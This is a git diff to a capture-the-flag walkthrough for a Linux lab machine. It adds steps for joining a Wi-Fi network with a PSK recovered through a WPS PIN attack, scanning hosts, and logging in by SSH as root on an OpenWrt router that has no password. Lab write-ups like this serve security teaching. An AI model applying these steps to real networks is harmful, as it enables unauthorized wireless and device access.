@@ -5,6 +5,10 @@
 * **Operative System:** Linux
 * **Difficulty**: Medium
 * **Keywords**:
+  * OpenWRT
+  * OpenPLC 3 WebServer
+  * RCE
+  * CVE-2021-316
 
 ## 2. Enumeration
 
@@ -612,7 +616,7 @@ root@attica01:/tmp/file.Kf5# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K
 With the password and SSID of the AP, we can generate a wpa\_passphrase:
 
 ```
-root@attica01:/tmp/file.Kf5# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123!  
+root@attica01:/tmp/file.Kf5# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!'
 root@attica01:/tmp/file.Kf5# cat wpa_supplicant.conf
 network={
 	ssid="plcrouter"
@@ -621,53 +625,160 @@ network={
 }
 ```
 
-We can use this passphrase to establish a connection with the plcrouter.
+We can use this passphrase to establish a connection with the plcrouter using this command:
 
-
-
-
-
-
-
-```
-root@attica01:..# cd $(mktemp -d /tmp/file.XXX)
-root@attica01:/tmp/file.Kf5# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K 
-[*] Running wpa_supplicant...
-[*] Trying pin 12345670...
-[*] Scanning...
-[*] Authenticating...
-[+] Authenticated
-[*] Associating with AP...
-[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
-[*] Received Identity Request
-[*] Sending Identity Response...
-[*] Received WPS Message M1
-[P] E-Nonce: 7cc96706ce59a16cc03515e6d775e235
-[*] Building Message M2
-[P] PKR: 901208fd6b71c0d9f62d3d19c0de7575e6c4bf28885dbccbb2b3a7da1082bce5ab78b1983a5edc72b2b15977640a81aca1157874853c075335267bef1bdf126a66f45404c0b724d3aa9e635c19a57949f85f51d2dec25c034fbc2577c25fada4cffaac5f06f48106caee5c8275d9eb78072ef94b3cf1df49da60145035aeeace08a98151287e1fcfc6246d7c3bc3bb1c3aff2c8cec04c43c5a3585de5fab2a11281e6968c64e9ec12e4965d61ae132eccd0cfcb980fe5be0c78cdfac14bb6713
-[P] PKE: 8cd751e62ff5e0e8ec8a4acb7b7a2581d2d9e829f896ea59d5301be336bbdda74568211da5e356a79afc37b8f462b91ccb8ebad743998b04bdda9a02c07dbd52054931444831ac8c18f8d68a48c2086f12bfd20bf3a943a6b6c8bcafd8ecb8c4b7ddd3ee07895701680a3fa8c42a00895c7e535378bc2a4d1ebda0ebc8905c572017ccf69ccaa5c8f1cd8b590597c00a1ba9f0105193214e930e4f75615b51f39ef438dcc16f7c035a195c34f50715c75d2fd49691d682bf07e2830e81aefd42
-[P] Authkey: e7e1cc9ba7221860fef6b5c4f0aa50a499b651e31c421259834546b7246df7da
-[*] Received WPS Message M3
-[P] E-Hash1: bc457c74c149a9d8194f0b1cd3b437efb30cd94cfa3fd6e7265db966f596c8d3
-[P] E-Hash2: 4809450b55c0e433a52068ee6bbad90ccd50525c49823cd87865fbbd11e8e62a
-[*] Building Message M4
-[*] Received WPS Message M5
-[*] Building Message M6
-[*] Received WPS Message M7
-[+] WPS PIN: 12345670
-[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
-[+] AP SSID: plcrouter
-> wpa_supplicant.confle.Kf5# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123!  
-root@attica01:/tmp/file.Kf5# cat wpa_supplicant.conf
-network={
-	ssid="plcrouter"
-	#psk="NoWWEDoKnowWhaTisReal123!"
-	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
-}
-
+```bash
+# -B : Run in background (daemon mode)
+# -c : Specify a configuration file (the wpa_passphrase created previously)
+# -i : Specify a wireless network interface 
+wpa_supplicant -B -c wpa_supplicant.conf -i wlan0
 ```
 
-## 4. Privilege Escalation
+Once executed, we have to asign an IP address to our interface. We can do this using `dhcpclient` or doing it manually with `ip` command. In this case i'll do it manually.
+
+```bash
+ip addr add 192.168.1.84/24 dev wlan0
+```
+
+To verify the connection to plcrouter, we can execute the following commands:
+
+```
+root@attica03:/tmp/file.fin# iw dev wlan0 info
+Interface wlan0
+	ifindex 7
+	wdev 0x400000001
+	addr 02:00:00:00:04:00
+	ssid plcrouter
+	type managed
+	wiphy 4
+	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+	txpower 20.00 dBm
+	
+root@attica03:/tmp/file.fin# ifconfig wlan0
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.84  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet6 fe80::ff:fe00:400  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:04:00  txqueuelen 1000  (Ethernet)
+        RX packets 40  bytes 6966 (6.9 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 815  bytes 50606 (50.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@attica03:/tmp/file.fin# ping -c 1 192.168.1.1
+PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.269 ms
+
+--- 192.168.1.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.269/0.269/0.269/0.000 ms
+```
+
+We have access to the plcrouter wireless network. To discover all hosts connected to this network, we must perform a host scan. I am going to use `network-scan.sh` from my [github repository](https://github.com/mind2hex/hackpack\_usb) under Linux/scripts/ directory.
+
+```
+root@attica03:/tmp/file.fin# bash network-scan.sh -h
+usage: ./network-monitor.sh [OPTIONS] {-i|--interface}
+Description:
+   This script scan network specified for connected hosts.
+Options: 
+     -i,--interface <iface>            : Specify interface                                       
+     -r,--range <ip-addr-range/CIDR>   : Specify ip address range to scan                        
+     -o,--output <filename>            : Specify file to save output                             
+     --privscan                        : Use arp ping to scan network, requires admin privileges 
+     --usage                           : Print examples of usage                                 
+     -h,--help                         : Print this help message
+
+root@attica03:/tmp/file.fin# bash network-scan.sh -i wlan0 -r 192.168.1.1/24
+
+[!] Using ping
+192.168.1.1 is alive
+192.168.1.84 is alive
+```
+
+Only two host and `192.168.1.84` is the address of the wireless interface we used before to connect to plcrouter so lets perform a simple GET request to `192.168.1.1` (gateway).
+
+```
+root@attica03:/tmp/file.fin# curl http://192.168.1.1/
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+		<meta http-equiv="Pragma" content="no-cache" />
+                <meta http-equiv="Expires" content="0" />
+		<meta http-equiv="refresh" content="0; URL=cgi-bin/luci/" />
+		<style type="text/css">
+			body { background: white; font-family: arial, helvetica, sans-serif; }
+			a { color: black; }
+
+			@media (prefers-color-scheme: dark) {
+				body { background: black; }
+				a { color: white; }
+			}
+		</style>
+	</head>
+	<body>
+		<a href="cgi-bin/luci/">LuCI - Lua Configuration Interface</a>
+	</body>
+</html>
+```
+
+The default gateway is an openwrt and is executing luCI web interface.&#x20;
+
+Scanning the ports of `192.168.1.1` with a static nmap binary we got the following ports open.
+
+<pre><code><strong>root@attica03:/tmp/file.fin# ./nmap 192.168.1.1 -T5 -n
+</strong>
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-04-15 16:34 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 78.23% done; ETC: 16:34 (0:00:01 remaining)
+Nmap scan report for 192.168.1.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000031s latency).
+Not shown: 1152 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+53/tcp  open  domain
+80/tcp  open  http
+443/tcp open  https
+MAC Address: 02:00:00:00:01:00 (Unknown)
+</code></pre>
+
+## 4. Root Flag
+
+To get the root flag we only have to access via SSH using openwrt ssh default credentials (username only) `root`.
+
+```
+root@attica03:/tmp/file.fin# ssh root@192.168.1.1
+
+
+BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ OpenWrt 23.05.2, r23630-842932a63d
+ -----------------------------------------------------
+=== WARNING! =====================================
+There is no root password defined on this device!
+Use the "passwd" command to set up a new password
+in order to prevent unauthorized SSH logins.
+--------------------------------------------------
+root@ap:~# ls
+root.txt
+root@ap:~# cat root.txt
+59a22d97e21578027403846d94aa6354
+root@ap:~# 
+```
 
 ## 5. References
 
+* [OpenWRT SSH Default Credentials](https://openwrt.org/docs/guide-quick-start/sshadministration)
+* [CVE-2021-31630](https://avd.aquasec.com/nvd/2021/cve-2021-31630/)
+* [My Github  Repository](https://github.com/mind2hex/hackpack\_usb)
+* [Exploit used](https://github.com/mind2hex/CVE-2021-31630/tree/main)
